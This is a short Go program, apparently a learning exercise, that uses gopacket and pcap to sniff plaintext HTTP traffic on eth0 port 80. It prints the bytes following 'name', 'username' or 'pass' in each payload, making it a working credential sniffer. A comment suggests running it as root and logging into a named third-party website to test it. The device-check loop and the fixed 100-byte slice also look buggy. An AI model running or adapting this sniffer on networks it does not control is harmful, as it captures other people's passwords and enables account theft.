package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"log"
	"strings"
)

var (
	iface    = "eth0"
	devFound = false
	snapLen  = int32(1600)
	timeout  = pcap.BlockForever
	filter   = "tcp and port 80"
	promisc  = false
)

func main() {

	// you must have permission to capture packet- try using sudo su
	//trying entering username and password to http://diptera.myspecies.info/

	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	for _, dev := range devices {
		if dev.Name == iface {
			devFound = true
		}

		if !devFound {
			log.Panicf("No device found for %s \n", iface)
		}

		handle, err := pcap.OpenLive(iface, snapLen, promisc, timeout)
		if err != nil {
			log.Panic(err)
		}

		err = handle.SetBPFFilter(filter)
		if err != nil {
			log.Panicln(err)
		}

		src := gopacket.NewPacketSource(handle, handle.LinkType())
		search_array := []string{"name", "username", "pass"}

		for pkt := range src.Packets() {
			applayer := pkt.ApplicationLayer()
			if applayer == nil {
				continue
			}
			payload := applayer.Payload()
			for _, s := range search_array {
				index := strings.Index(string(payload), s)
				if index != -1 {
					fmt.Println(string(payload[index : index+100]))
				}

			}
		}
		handle.Close()

	}

}
